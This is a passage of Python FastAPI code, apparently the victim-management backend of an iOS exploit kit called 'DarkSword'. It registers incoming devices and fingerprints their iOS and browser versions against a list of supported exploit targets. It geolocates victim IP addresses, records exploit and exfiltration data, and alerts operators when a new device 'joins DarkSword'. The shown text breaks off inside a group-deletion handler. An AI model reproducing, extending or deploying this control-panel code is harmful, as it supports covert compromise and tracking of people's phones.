from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from sqlalchemy import desc, asc, func, or_, and_
from pydantic import BaseModel, Field
from typing import Optional, List
import re
import uuid as _uuid
from datetime import datetime, timedelta

from ..database import (
    get_db, Device, DeviceGroup, Log, ExfilData, Command, DeviceExploitLog, create_audit_log, TrafficChannel, LandingTemplate,
    compute_os_type, compute_compatible_level, normalize_device_uuid, resolve_forwarded_uuid_ua,
)
from ..auth import get_current_user
from .notifications import broadcast_notification_sync
from .settings import require_module_2fa
from ..limiter import rate_limit
from ._helpers import (
    apply_agent_filter_device, apply_agent_filter_group,
    apply_agent_filter_channel, apply_agent_filter_template,
    apply_agent_filter_exfil, apply_agent_filter_command,
    assert_owns_device
)

router = APIRouter(prefix="/api/devices", tags=["devices"], redirect_slashes=False)


class DeviceRegisterRequest(BaseModel):
    device_uuid: Optional[str] = None
    user_agent: Optional[str] = None
    force_is_new: Optional[bool] = False
    force_was_offline: Optional[bool] = False
    host: Optional[str] = None
    referer: Optional[str] = None
    access_path: Optional[str] = None
    hw_model: Optional[str] = None
    channel_id: Optional[int] = None
    template_id: Optional[int] = None
    extra: Optional[dict] = Field(default_factory=dict)


class GroupCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    color: Optional[str] = "#409EFF"
    description: Optional[str] = ""


class GroupUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=1, max_length=100)
    color: Optional[str] = None
    description: Optional[str] = None


class BatchDeleteRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)


class BatchSetGroupRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    group_id: Optional[int] = None


class BatchSetEnabledRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    enabled: bool = True


class BatchSetChannelRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    channel_id: Optional[int] = None


class BatchSetTemplateRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    template_id: Optional[int] = None


class DevicePatchRequest(BaseModel):
    group_id: Optional[int] = None
    note: Optional[str] = None
    status: Optional[str] = None
    enabled: Optional[bool] = None
    host: Optional[str] = None
    referer: Optional[str] = None
    access_path: Optional[str] = None
    hw_model: Optional[str] = None
    ip_location: Optional[str] = None
    channel_id: Optional[int] = None
    template_id: Optional[int] = None


SUPPORTED_IOS_VERSIONS = {
    "13.0", "13.1", "13.2", "13.3", "13.4", "13.5", "13.6", "13.7",
    "14.0", "14.1", "14.2", "14.3", "14.4", "14.5", "14.6", "14.7", "14.8",
    "15.0", "15.1", "15.2", "15.3", "15.4", "15.5", "15.6", "15.7", "15.8",
    "16.0", "16.1", "16.2", "16.3", "16.4", "16.5", "16.6", "16.7",
    "17.0", "17.1", "17.2",
}

_HWM_TO_MODEL = {
    "iPhone1,1": "iPhone", "iPhone1,2": "iPhone 3G", "iPhone2,1": "iPhone 3GS",
    "iPhone3,1": "iPhone 4", "iPhone3,2": "iPhone 4 (GSM Rev A)", "iPhone3,3": "iPhone 4 (CDMA)",
    "iPhone4,1": "iPhone 4S",
    "iPhone5,1": "iPhone 5 (GSM)", "iPhone5,2": "iPhone 5 (GSM+CDMA)",
    "iPhone5,3": "iPhone 5c (GSM)", "iPhone5,4": "iPhone 5c (Global)",
    "iPhone6,1": "iPhone 5s (GSM)", "iPhone6,2": "iPhone 5s (Global)",
    "iPhone7,1": "iPhone 6 Plus", "iPhone7,2": "iPhone 6",
    "iPhone8,1": "iPhone 6s", "iPhone8,2": "iPhone 6s Plus", "iPhone8,4": "iPhone SE (1st)",
    "iPhone9,1": "iPhone 7 (CDMA)", "iPhone9,2": "iPhone 7 Plus (CDMA)",
    "iPhone9,3": "iPhone 7 (GSM)", "iPhone9,4": "iPhone 7 Plus (GSM)",
    "iPhone10,1": "iPhone 8 (CDMA)", "iPhone10,2": "iPhone 8 Plus (CDMA)", "iPhone10,3": "iPhone X (CDMA)",
    "iPhone10,4": "iPhone 8 (GSM)", "iPhone10,5": "iPhone 8 Plus (GSM)", "iPhone10,6": "iPhone X (GSM)",
    "iPhone11,2": "iPhone XS", "iPhone11,4": "iPhone XS Max (China)", "iPhone11,6": "iPhone XS Max",
    "iPhone11,8": "iPhone XR",
    "iPhone12,1": "iPhone 11", "iPhone12,3": "iPhone 11 Pro", "iPhone12,5": "iPhone 11 Pro Max",
    "iPhone12,8": "iPhone SE (2nd)",
    "iPhone13,1": "iPhone 12 mini", "iPhone13,2": "iPhone 12", "iPhone13,3": "iPhone 12 Pro",
    "iPhone13,4": "iPhone 12 Pro Max",
    "iPhone14,2": "iPhone 13 Pro", "iPhone14,3": "iPhone 13 Pro Max", "iPhone14,4": "iPhone 13 mini",
    "iPhone14,5": "iPhone 13", "iPhone14,6": "iPhone SE (3rd)",
    "iPhone14,7": "iPhone 14", "iPhone14,8": "iPhone 14 Plus",
    "iPhone15,2": "iPhone 14 Pro", "iPhone15,3": "iPhone 14 Pro Max",
    "iPhone15,4": "iPhone 15", "iPhone15,5": "iPhone 15 Plus",
    "iPhone16,1": "iPhone 15 Pro", "iPhone16,2": "iPhone 15 Pro Max",
    "iPhone17,1": "iPhone 16 Pro", "iPhone17,2": "iPhone 16 Pro Max",
    "iPhone17,3": "iPhone 16", "iPhone17,4": "iPhone 16 Plus",
    "iPhone17,5": "iPhone 16e",
    "iPad1,1": "iPad", "iPad2,1": "iPad 2 (WiFi)", "iPad2,2": "iPad 2 (GSM)",
    "iPad2,3": "iPad 2 (CDMA)", "iPad2,4": "iPad 2 (WiFi Rev A)",
    "iPad3,1": "iPad (3rd, WiFi)", "iPad3,2": "iPad (3rd, CDMA)", "iPad3,3": "iPad (3rd, GSM)",
    "iPad3,4": "iPad (4th, WiFi)", "iPad3,5": "iPad (4th, GSM)", "iPad3,6": "iPad (4th, CDMA)",
    "iPad4,1": "iPad Air (WiFi)", "iPad4,2": "iPad Air (Cellular)",
    "iPad4,3": "iPad Air (China)",
    "iPad5,3": "iPad Air 2 (WiFi)", "iPad5,4": "iPad Air 2 (Cellular)",
    "iPad6,7": "iPad Pro 12.9\" (WiFi)", "iPad6,8": "iPad Pro 12.9\" (Cellular)",
    "iPad6,3": "iPad Pro 9.7\" (WiFi)", "iPad6,4": "iPad Pro 9.7\" (Cellular)",
    "iPad6,11": "iPad 5 (WiFi)", "iPad6,12": "iPad 5 (Cellular)",
    "iPad7,1": "iPad Pro 12.9\" 2nd (WiFi)", "iPad7,2": "iPad Pro 12.9\" 2nd (Cellular)",
    "iPad7,3": "iPad Pro 10.5\" (WiFi)", "iPad7,4": "iPad Pro 10.5\" (Cellular)",
    "iPad7,5": "iPad 6 (WiFi)", "iPad7,6": "iPad 6 (Cellular)",
    "iPad7,11": "iPad 7 (WiFi)", "iPad7,12": "iPad 7 (Cellular)",
    "iPad8,1": "iPad Pro 11\" (WiFi)", "iPad8,2": "iPad Pro 11\" (WiFi 1TB)",
    "iPad8,3": "iPad Pro 11\" (Cellular)", "iPad8,4": "iPad Pro 11\" (Cellular 1TB)",
    "iPad8,5": "iPad Pro 12.9\" 3rd (WiFi)", "iPad8,6": "iPad Pro 12.9\" 3rd (WiFi 1TB)",
    "iPad8,7": "iPad Pro 12.9\" 3rd (Cellular)", "iPad8,8": "iPad Pro 12.9\" 3rd (Cellular 1TB)",
    "iPad8,9": "iPad Pro 11\" 2nd (WiFi)", "iPad8,10": "iPad Pro 11\" 2nd (Cellular)",
    "iPad8,11": "iPad Pro 12.9\" 4th (WiFi)", "iPad8,12": "iPad Pro 12.9\" 4th (Cellular)",
    "iPad11,1": "iPad mini 5 (WiFi)", "iPad11,2": "iPad mini 5 (Cellular)",
    "iPad11,3": "iPad Air 3 (WiFi)", "iPad11,4": "iPad Air 3 (Cellular)",
    "iPad11,6": "iPad 8 (WiFi)", "iPad11,7": "iPad 8 (Cellular)",
    "iPad12,1": "iPad 9 (WiFi)", "iPad12,2": "iPad 9 (Cellular)",
    "iPad13,1": "iPad Air 4 (WiFi)", "iPad13,2": "iPad Air 4 (Cellular)",
    "iPad13,4": "iPad Pro 11\" 3rd (WiFi)", "iPad13,5": "iPad Pro 11\" 3rd (5G)",
    "iPad13,6": "iPad Pro 12.9\" 5th (WiFi)", "iPad13,7": "iPad Pro 12.9\" 5th (5G)",
    "iPad13,8": "iPad Air 5 (WiFi)", "iPad13,9": "iPad Air 5 (5G)",
    "iPad13,16": "iPad 10 (WiFi)", "iPad13,17": "iPad 10 (5G)",
    "iPad14,1": "iPad mini 6 (WiFi)", "iPad14,2": "iPad mini 6 (5G)",
    "iPad14,3": "iPad Pro 11\" 4th (WiFi)", "iPad14,4": "iPad Pro 11\" 4th (5G)",
    "iPad14,5": "iPad Pro 12.9\" 6th (WiFi)", "iPad14,6": "iPad Pro 12.9\" 6th (5G)",
    "iPad14,8": "iPad Air 11\" M2 (WiFi)", "iPad14,9": "iPad Air 11\" M2 (5G)",
    "iPad14,10": "iPad Air 13\" M2 (WiFi)", "iPad14,11": "iPad Air 13\" M2 (5G)",
    "iPad15,1": "iPad mini 7 (WiFi)", "iPad15,2": "iPad mini 7 (5G)",
    "iPad15,3": "iPad Pro 11\" 5th M4 (WiFi)", "iPad15,4": "iPad Pro 11\" 5th M4 (5G)",
    "iPad15,5": "iPad Pro 13\" M4 (WiFi)", "iPad15,6": "iPad Pro 13\" M4 (5G)",
    "iPad16,3": "iPad Air 11\" M3 (WiFi)", "iPad16,4": "iPad Air 11\" M3 (5G)",
    "iPad16,5": "iPad Air 13\" M3 (WiFi)", "iPad16,6": "iPad Air 13\" M3 (5G)",
}

_HWM_TO_CHIPSET = {
    "iPhone1,1": "S5L8900", "iPhone1,2": "S5L8900", "iPhone2,1": "S5L8920",
    "iPhone3,1": "Apple A4", "iPhone3,2": "Apple A4", "iPhone3,3": "Apple A4",
    "iPhone4,1": "Apple A5",
    "iPhone5,1": "Apple A6", "iPhone5,2": "Apple A6",
    "iPhone5,3": "Apple A6", "iPhone5,4": "Apple A6",
    "iPhone6,1": "Apple A7", "iPhone6,2": "Apple A7",
    "iPhone7,1": "Apple A8", "iPhone7,2": "Apple A8",
    "iPhone8,1": "Apple A9", "iPhone8,2": "Apple A9", "iPhone8,4": "Apple A9",
    "iPhone9,1": "Apple A10 Fusion", "iPhone9,2": "Apple A10 Fusion",
    "iPhone9,3": "Apple A10 Fusion", "iPhone9,4": "Apple A10 Fusion",
    "iPhone10,1": "Apple A11 Bionic", "iPhone10,2": "Apple A11 Bionic", "iPhone10,3": "Apple A11 Bionic",
    "iPhone10,4": "Apple A11 Bionic", "iPhone10,5": "Apple A11 Bionic", "iPhone10,6": "Apple A11 Bionic",
    "iPhone11,2": "Apple A12 Bionic", "iPhone11,4": "Apple A12 Bionic", "iPhone11,6": "Apple A12 Bionic",
    "iPhone11,8": "Apple A12 Bionic",
    "iPhone12,1": "Apple A13 Bionic", "iPhone12,3": "Apple A13 Bionic", "iPhone12,5": "Apple A13 Bionic",
    "iPhone12,8": "Apple A13 Bionic",
    "iPhone13,1": "Apple A14 Bionic", "iPhone13,2": "Apple A14 Bionic",
    "iPhone13,3": "Apple A14 Bionic", "iPhone13,4": "Apple A14 Bionic",
    "iPhone14,2": "Apple A15 Bionic", "iPhone14,3": "Apple A15 Bionic",
    "iPhone14,4": "Apple A15 Bionic", "iPhone14,5": "Apple A15 Bionic", "iPhone14,6": "Apple A15 Bionic",
    "iPhone14,7": "Apple A15 Bionic", "iPhone14,8": "Apple A15 Bionic",
    "iPhone15,2": "Apple A16 Bionic", "iPhone15,3": "Apple A16 Bionic",
    "iPhone15,4": "Apple A16 Bionic", "iPhone15,5": "Apple A16 Bionic",
    "iPhone16,1": "Apple A17 Pro", "iPhone16,2": "Apple A17 Pro",
    "iPhone17,1": "Apple A18 Pro", "iPhone17,2": "Apple A18 Pro",
    "iPhone17,3": "Apple A18", "iPhone17,4": "Apple A18",
    "iPhone17,5": "Apple A18",
}

_MODEL_TO_CHIPSET = {
    "iPhone SE (1st)": "Apple A9", "iPhone SE (2nd)": "Apple A13 Bionic",
    "iPhone SE (3rd)": "Apple A15 Bionic",
    "iPhone 6s": "Apple A9", "iPhone 6s Plus": "Apple A9",
    "iPhone 7": "Apple A10 Fusion", "iPhone 7 Plus": "Apple A10 Fusion",
    "iPhone 8": "Apple A11 Bionic", "iPhone 8 Plus": "Apple A11 Bionic", "iPhone X": "Apple A11 Bionic",
    "iPhone XS": "Apple A12 Bionic", "iPhone XS Max": "Apple A12 Bionic", "iPhone XR": "Apple A12 Bionic",
    "iPhone 11": "Apple A13 Bionic", "iPhone 11 Pro": "Apple A13 Bionic", "iPhone 11 Pro Max": "Apple A13 Bionic",
    "iPhone 12 mini": "Apple A14 Bionic", "iPhone 12": "Apple A14 Bionic",
    "iPhone 12 Pro": "Apple A14 Bionic", "iPhone 12 Pro Max": "Apple A14 Bionic",
    "iPhone 13 mini": "Apple A15 Bionic", "iPhone 13": "Apple A15 Bionic",
    "iPhone 13 Pro": "Apple A15 Bionic", "iPhone 13 Pro Max": "Apple A15 Bionic",
    "iPhone 14": "Apple A15 Bionic", "iPhone 14 Plus": "Apple A15 Bionic",
    "iPhone 14 Pro": "Apple A16 Bionic", "iPhone 14 Pro Max": "Apple A16 Bionic",
    "iPhone 15": "Apple A16 Bionic", "iPhone 15 Plus": "Apple A16 Bionic",
    "iPhone 15 Pro": "Apple A17 Pro", "iPhone 15 Pro Max": "Apple A17 Pro",
    "iPhone 16": "Apple A18", "iPhone 16 Plus": "Apple A18", "iPhone 16e": "Apple A18",
    "iPhone 16 Pro": "Apple A18 Pro", "iPhone 16 Pro Max": "Apple A18 Pro",
}

_IP_LOC_CACHE = {}


def _resolve_ip_location(ip: Optional[str]) -> Optional[str]:
    if not ip or ip in ("127.0.0.1", "::1", "0.0.0.0"):
        return "本地/内网"
    if ip in _IP_LOC_CACHE:
        return _IP_LOC_CACHE[ip]
    import json as _json
    import urllib.request as _urlreq
    try:
        url = f"http://ip-api.com/json/{ip}?lang=zh-CN&fields=status,country,regionName,city,isp,query"
        req = _urlreq.Request(url, headers={"User-Agent": "DarkSword-Admin/1.0"})
        with _urlreq.urlopen(req, timeout=2) as resp:
            data = _json.loads(resp.read().decode("utf-8", errors="replace"))
        if data.get("status") != "success":
            _IP_LOC_CACHE[ip] = None
            return None
        parts = [data.get("country"), data.get("regionName"), data.get("city")]
        parts = [str(p).strip() for p in parts if p and str(p).strip()]
        result = "/".join(parts) if parts else None
        if data.get("isp") and len(str(data["isp"])) <= 30:
            result = (result + " · " + str(data["isp"])) if result else str(data["isp"])
        _IP_LOC_CACHE[ip] = result
        return result
    except Exception:
        return None


def _parse_ua_v2(ua: Optional[str]) -> dict:
    """结构化解析 UA：区分 iOS/Android/macOS 版本 + 浏览器类型+版本 + WebKit 版本。
    返回: dict(os_type, os_version, os_raw, browser_name, browser_version, webkit_version, device_family, safari_version_raw)
    """
    r = {
        "os_type": None, "os_version": None, "os_raw": None,
        "browser_name": None, "browser_version": None, "webkit_version": None,
        "device_family": None, "safari_version_raw": None,
    }
    if not ua:
        return r
    s = str(ua)

    def _clean_ver(raw: str) -> str:
        parts = str(raw).split(".")
        out = []
        for p in parts:
            try:
                out.append(str(int(p)))
            except (ValueError, TypeError):
                break
        while len(out) > 1 and out[-1] == "0":
            out.pop()
        return ".".join(out) if out else ""

    ios_ua_cpu_version = None
    m = re.search(r'CPU iPhone OS (\d+)(?:_(\d+))?(?:_(\d+))?\s+like Mac OS X', s)
    if m:
        maj, mn, pt = m.group(1), m.group(2) or '0', m.group(3) or '0'
        try:
            if 1 <= int(maj) <= 40:
                r["os_type"] = "iOS"
                v = f"{maj}.{mn}.{pt}" if pt and int(pt) > 0 else (f"{maj}.{mn}" if int(mn) > 0 else maj)
                ios_ua_cpu_version = _clean_ver(v)
                r["os_raw"] = ios_ua_cpu_version
                r["os_version"] = ios_ua_cpu_version
        except (ValueError, TypeError):
            pass
    if not r["os_type"]:
        m2 = re.search(r'CPU OS (\d+)(?:_(\d+))?(?:_(\d+))?\s+like Mac OS X', s)
        if m2:
            maj, mn, pt = m2.group(1), m2.group(2) or '0', m2.group(3) or '0'
            try:
                if 1 <= int(maj) <= 40:
                    r["os_type"] = "iOS"
                    v = f"{maj}.{mn}.{pt}" if pt and int(pt) > 0 else (f"{maj}.{mn}" if int(mn) > 0 else maj)
                    ios_ua_cpu_version = _clean_ver(v)
                    r["os_raw"] = ios_ua_cpu_version
                    r["os_version"] = ios_ua_cpu_version
            except (ValueError, TypeError):
                pass
    if not r["os_type"]:
        m3 = re.search(r'Mac OS X (\d+)[_.](\d+)(?:[_.](\d+))?', s)
        if m3:
            maj, mn, pt = m3.group(1), m3.group(2), m3.group(3) or '0'
            try:
                if 10 <= int(maj) <= 20:
                    r["os_type"] = "macOS"
                    v = f"{maj}.{mn}.{pt}" if pt and int(pt) > 0 else f"{maj}.{mn}"
                    r["os_raw"] = _clean_ver(v)
                    r["os_version"] = r["os_raw"]
            except (ValueError, TypeError):
                pass
    if not r["os_type"]:
        m4 = re.search(r'Android\s+(\d+(?:\.\d+){0,2})', s, re.IGNORECASE)
        if m4:
            r["os_type"] = "Android"
            r["os_raw"] = _clean_ver(m4.group(1))
            r["os_version"] = r["os_raw"]

    m_saf_build = re.search(r'Safari/([0-9.]+)', s)
    if m_saf_build:
        r["webkit_version"] = m_saf_build.group(1)
    m_saf_ver = re.search(r'Version/([0-9.]+)', s)
    if m_saf_ver:
        r["safari_version_raw"] = _clean_ver(m_saf_ver.group(1))

    if "CriOS/" in s:
        m = re.search(r'CriOS/([0-9.]+)', s)
        r["browser_name"] = "Chrome"
        r["browser_version"] = m.group(1) if m else None
    elif "EdgiOS/" in s or "Edge/" in s:
        m = re.search(r'(?:EdgiOS|Edge)/([0-9.]+)', s)
        r["browser_name"] = "Edge"
        r["browser_version"] = m.group(1) if m else None
    elif "FxiOS/" in s or ("Firefox/" in s and ("iPhone" in s or "iPad" in s)):
        m = re.search(r'(?:FxiOS|Firefox)/([0-9.]+)', s)
        r["browser_name"] = "Firefox"
        r["browser_version"] = m.group(1) if m else None
    elif "OPiOS/" in s or "OPR/" in s or "Opera/" in s:
        m = re.search(r'(?:OPiOS|OPR|Opera)/([0-9.]+)', s)
        r["browser_name"] = "Opera"
        r["browser_version"] = m.group(1) if m else None
    elif "MicroMessenger/" in s or "WeChat/" in s:
        m = re.search(r'(?:MicroMessenger|WeChat)/([0-9.]+)', s)
        r["browser_name"] = "微信"
        r["browser_version"] = m.group(1) if m else None
    elif "QQ/" in s and ("MQQBrowser" in s or " QQ/" in s):
        m = re.search(r'MQQBrowser/([0-9.]+)|QQ/([0-9.]+)', s)
        r["browser_name"] = "QQ"
        r["browser_version"] = (m.group(1) or m.group(2)) if m else None
    elif "DuckDuckGo/" in s:
        m = re.search(r'DuckDuckGo/([0-9.]+)', s)
        r["browser_name"] = "DuckDuckGo"
        r["browser_version"] = m.group(1) if m else None
    elif "Brave/" in s:
        r["browser_name"] = "Brave"
        m = re.search(r'Brave/([0-9.]+)|Chrome/([0-9.]+)', s)
        r["browser_version"] = (m.group(1) or m.group(2)) if m else None
    elif "Safari/" in s and r.get("safari_version_raw"):
        r["browser_name"] = "Safari"
        r["browser_version"] = r["safari_version_raw"]
    elif "Safari/" in s:
        r["browser_name"] = "Safari"

    if r["os_type"] == "iOS" and r.get("safari_version_raw"):
        def _maj(v):
            try:
                return int(str(v).split(".")[0])
            except Exception:
                return 0
        maj_saf = _maj(r["safari_version_raw"])
        maj_cpu = _maj(r.get("os_version") or "0")
        if maj_saf > 0 and maj_cpu > 0 and maj_saf > maj_cpu:
            r["os_version"] = r["safari_version_raw"]
            r["os_raw"] = r["safari_version_raw"]

    if 'iPhone' in s:
        r["device_family"] = "iPhone"
    elif 'iPad' in s:
        r["device_family"] = "iPad"
    elif 'iPod' in s:
        r["device_family"] = "iPod Touch"
    elif r["os_type"] == "Android":
        r["device_family"] = "Android"
    elif r["os_type"] == "macOS":
        r["device_family"] = "Mac"

    return r


def _guess_model_from_hw_model(hw_model: Optional[str]) -> Optional[str]:
    if not hw_model:
        return None
    h = str(hw_model).strip()
    if h in _HWM_TO_MODEL:
        return _HWM_TO_MODEL[h]
    return None


def _guess_chipset(hw_model: Optional[str], model_name: Optional[str], os_version: Optional[str],
                   device_family: Optional[str]) -> Optional[str]:
    if hw_model:
        c = _HWM_TO_CHIPSET.get(str(hw_model).strip())
        if c:
            return c
    if model_name and model_name in _MODEL_TO_CHIPSET:
        return _MODEL_TO_CHIPSET[model_name]
    if not os_version or not device_family or device_family not in ("iPhone", "iPad", "iPod Touch"):
        return None
    parts = str(os_version).split(".")
    try:
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
    except (ValueError, TypeError):
        return None
    ver = major * 100 + minor
    if device_family == "iPhone":
        if ver >= 2000:
            return "A16 Bionic / A17 Pro / A18"
        if ver >= 1900:
            return "A16 Bionic / A17 Pro / A18"
        if ver >= 1800:
            return "A15 Bionic / A16 Bionic / A17 Pro"
        if ver >= 1700:
            return "A13 Bionic / A14 Bionic / A15 Bionic / A16 Bionic"
        if ver >= 1600:
            return "A12 Bionic / A13 Bionic / A14 Bionic / A15 Bionic"
        if ver >= 1500:
            return "A11 Bionic / A12 Bionic / A13 Bionic / A14 Bionic"
        if ver >= 1400:
            return "A9 / A10 Fusion / A11 Bionic / A12 Bionic / A13 Bionic"
        if ver >= 1300:
            return "A8 / A9 / A10 Fusion / A11 Bionic / A12 Bionic"
    return None


def _parse_device_info(device: Device, extra: Optional[dict] = None):
    if not device.user_agent and not (extra and any(extra.get(k) for k in ("screen", "dpr", "platform"))):
        return
    ua = device.user_agent or ""
    parsed = _parse_ua_v2(ua)

    os_ver = parsed.get("os_version")
    def _maj(v):
        try:
            return int(str(v).split(".")[0])
        except Exception:
            return 0
    if os_ver:
        if not device.os_version:
            device.os_version = os_ver
        else:
            maj_old = _maj(device.os_version)
            maj_new = _maj(os_ver)
            if (maj_new > maj_old) or (maj_old > 25 >= maj_new):
                device.os_version = os_ver
    if not device.os_version and parsed.get("safari_version_raw"):
        maj_saf = _maj(parsed["safari_version_raw"])
        maj_cpu = _maj(parsed.get("os_version") or "0")
        if maj_saf > 0 and (maj_saf > maj_cpu):
            device.os_version = parsed["safari_version_raw"]

    if parsed.get("browser_version"):
        if device.safari_version != parsed["browser_version"]:
            device.safari_version = parsed["browser_version"]

    device_family = parsed.get("device_family")
    model_from_hw = _guess_model_from_hw_model(getattr(device, "hw_model", None))

    if model_from_hw:
        if not device.device_model or device.device_model in ("iPhone", "iPad", "iPod Touch", "Android", "Mac"):
            device.device_model = model_from_hw
    elif device_family and (not device.device_model or device.device_model in (
            "iPhone", "iPad", "iPod Touch", "Android", "Mac")):
        device.device_model = device_family

    current_model = model_from_hw or device.device_model
    chip = _guess_chipset(
        getattr(device, "hw_model", None),
        current_model,
        device.os_version,
        parsed.get("device_family"),
    )
    if chip and not device.chipset:
        device.chipset = chip
    elif chip and device.chipset:
        try:
            if device.chipset and "/" not in str(device.chipset) and "/" in chip:
                device.chipset = chip
        except Exception:
            pass

    os_type_val = compute_os_type(ua, device.os_version)
    if os_type_val:
        device.os_type = os_type_val
    cl_val = compute_compatible_level(device.os_version, parsed.get("browser_name"))
    if cl_val:
        device.compatible_level = cl_val


def _is_ios_compatible(os_version: Optional[str], browser_name: Optional[str] = None) -> Optional[str]:
    return compute_compatible_level(os_version, browser_name)


@rate_limit("180/minute")
@router.post("/register")
async def register_device(request: Request, payload: DeviceRegisterRequest, db: Session = Depends(get_db)):
    client_ip = request.client.host if request.client else None
    header_ua = request.headers.get("user-agent") or ""
    raw_uuid = payload.device_uuid or None
    # exploit_server 转发 register 时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，
    # 避免 ios-→dev- 幽灵记录；仅对全新 UUID 做前缀校正（PC 缓存旧 ios-/unknown- 兜底）。
    if raw_uuid:
        uuid, ua = resolve_forwarded_uuid_ua(db, raw_uuid, payload.user_agent, header_ua)
    else:
        ua = payload.user_agent or header_ua
        uuid = None
    if not uuid:
        if ua and any(k in ua for k in ("iPhone", "iPad", "iPod", "iOS")):
            uuid = "ios-" + _uuid.uuid4().hex[:16]
        else:
            uuid = "dev-" + _uuid.uuid4().hex[:16]
    device = db.query(Device).filter(Device.device_uuid == uuid).first()
    now = datetime.now()
    is_new = device is None
    was_offline = False
    if is_new:
        device = Device(device_uuid=uuid, first_seen=now, last_seen=now, ip=client_ip, user_agent=ua, status="active", enabled=1)
        if payload.host: device.host = payload.host
        if payload.referer: device.referer = payload.referer
        if payload.access_path: device.access_path = payload.access_path
        if payload.hw_model: device.hw_model = payload.hw_model
        if payload.channel_id:
            device.channel_id = int(payload.channel_id)
            channel = db.query(TrafficChannel).filter(TrafficChannel.id == device.channel_id).first()
            if channel and channel.agent_id:
                device.agent_id = channel.agent_id
        if payload.template_id: device.template_id = int(payload.template_id)
        _parse_device_info(device)
        if client_ip and not device.ip_location:
            try:
                loc = _resolve_ip_location(client_ip)
                if loc: device.ip_location = loc
            except Exception:
                pass
        db.add(device)
    else:
        was_offline = device.status == "offline"
        device.last_seen = now
        device.ip = client_ip or device.ip
        if ua:
            device.user_agent = ua
            _parse_device_info(device)
        if payload.host: device.host = payload.host
        if payload.referer: device.referer = payload.referer
        if payload.access_path and not device.access_path: device.access_path = payload.access_path
        if payload.hw_model and not device.hw_model: device.hw_model = payload.hw_model
        if payload.channel_id: device.channel_id = int(payload.channel_id)
        if payload.template_id: device.template_id = int(payload.template_id)
        if device.enabled is None: device.enabled = 1
        if client_ip and not device.ip_location:
            try:
                loc = _resolve_ip_location(client_ip)
                if loc: device.ip_location = loc
            except Exception:
                pass
        device.status = "active"
    try:
        db.commit()
        db.refresh(device)
    except Exception:
        db.rollback()
        raise
    if is_new or was_offline or payload.force_is_new or payload.force_was_offline:
        model_desc = f"{device.device_model or '未知型号'} {('/ iOS ' + device.os_version) if device.os_version else ''}".strip()
        title = "🔔 新设备上线" if (is_new or payload.force_is_new) else "✅ 设备重新上线"
        broadcast_notification_sync(
            db, title=title,
            message=f"设备 {uuid[:10]}... {'已接入 DarkSword' if (is_new or payload.force_is_new) else '重新上线'}\n型号: {model_desc}\nIP: {client_ip or '未知'}",
            category="device", related_device_uuid=uuid,
            related_resource_type="device", related_resource_id=uuid,
        )
    return {
        "device_uuid": uuid, "status": device.status, "is_new": is_new,
        "was_offline": was_offline, "device_model": device.device_model,
        "os_version": device.os_version, "group_id": device.group_id,
    }


def _serialize_group(g: DeviceGroup, db: Optional[Session] = None):
    d = {
        "id": g.id, "name": g.name, "color": g.color or "#409EFF",
        "description": g.description or "",
        "created_at": g.created_at.isoformat() if g.created_at else None,
        "updated_at": g.updated_at.isoformat() if g.updated_at else None,
        "device_count": 0, "agent_id": g.agent_id,
    }
    if db is not None:
        try:
            d["device_count"] = db.query(func.count(Device.id)).filter(Device.group_id == g.id).scalar() or 0
        except Exception:
            pass
    return d


@router.get("/groups")
async def list_groups(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    group_q = apply_agent_filter_group(db.query(DeviceGroup), db, current_user)
    groups = group_q.order_by(asc(DeviceGroup.name)).all()
    items = [_serialize_group(g, db) for g in groups]
    ungrouped_q = apply_agent_filter_device(db.query(func.count(Device.id)), db, current_user).filter(Device.group_id.is_(None))
    ungrouped = ungrouped_q.scalar() or 0
    return {"total": len(items), "items": items, "ungrouped_count": ungrouped}


@router.post("/groups")
async def create_group(request: Request, payload: GroupCreate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    exists = db.query(DeviceGroup).filter(DeviceGroup.name == payload.name.strip()).first()
    if exists:
        raise HTTPException(status_code=400, detail="分组名称已存在")
    g = DeviceGroup(name=payload.name.strip(), color=payload.color or "#409EFF", description=payload.description or "")
    db.add(g)
    db.commit()
    db.refresh(g)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_create", resource_type="device_group",
                     resource_id=str(g.id), detail=f"创建设备分组 {g.name}",
                     ip_address=request.client.host if request.client else None)
    return _serialize_group(g, db)


@router.patch("/groups/{group_id}")
async def update_group(request: Request, group_id: int, payload: GroupUpdate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    g = db.query(DeviceGroup).filter(DeviceGroup.id == group_id).first()
    if not g:
        raise HTTPException(status_code=404, detail="分组不存在")
    if payload.name is not None:
        name = payload.name.strip()
        other = db.query(DeviceGroup).filter(DeviceGroup.name == name, DeviceGroup.id != g.id).first()
        if other:
            raise HTTPException(status_code=400, detail="分组名称已存在")
        g.name = name
    if payload.color is not None: g.color = payload.color
    if payload.description is not None: g.description = payload.description
    g.updated_at = datetime.now()
    db.commit()
    db.refresh(g)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_update", resource_type="device_group",
                     resource_id=str(g.id), detail=f"更新设备分组 {g.name}",
                     ip_address=request.client.host if request.client else None)
    return _serialize_group(g, db)


@router.delete("/groups/{group_id}")
async def delete_group(request: Request, group_id: int, move_devices_to_group_id: Optional[int] = None, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    g = db.query(DeviceGroup).filter(DeviceGroup.id == group_id).first()
    if not g:
        raise HTTPException(status_code=404, detail="分组不存在")
    old_name = g.name
    if move_devices_to_group_id is not None and move_devices_to_group_id > 0:
        target = db.query(DeviceGroup).filter(DeviceGroup.id == move_devices_to_group_id).first()
        if not target:
            raise HTTPException(status_code=400, detail="目标分组不存在")
